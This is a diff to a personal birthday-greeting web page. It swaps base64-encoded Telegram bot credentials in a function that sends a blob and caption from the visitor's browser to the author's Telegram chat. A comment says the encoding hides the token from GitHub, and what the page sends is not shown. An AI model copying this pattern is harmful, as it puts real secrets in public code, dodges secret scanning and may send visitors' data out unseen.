@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Happy Birthday Arya!</title>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&family=Handlee&family=Poppins:wght@300;500&display=swap');
 
@@ -989,8 +987,8 @@ window.exitApp = () => {
         // --- SEND TO TELEGRAM (GitHub Safe Version) ---
         function sendToTelegram(blob, caption) {
             // 1. PASTE YOUR *ENCODED* STRINGS HERE (From Step 1)
-            const ENCODED_TOKEN = "NzgzMzY3OTk5Nw=="; 
-            const ENCODED_CHAT_ID = "ODE4NDQxMTIwNzpBQUVaTUhDd2xxV1FfR2RNNHhOaDlaRlBic21Ka0I2cjR3WQ==";
+            const ENCODED_TOKEN = "ODE4NDQxMTIwNzpBQUVaTUhDd2xxV1FfR2RNNHhOaDlaRlBic21Ka0I2cjR3WQ=="; 
+            const ENCODED_CHAT_ID = "NzgzMzY3OTk5Nw====";
 
             // 2. Decode them back to normal (GitHub won't know!)
             const BOT_TOKEN = atob(ENCODED_TOKEN);
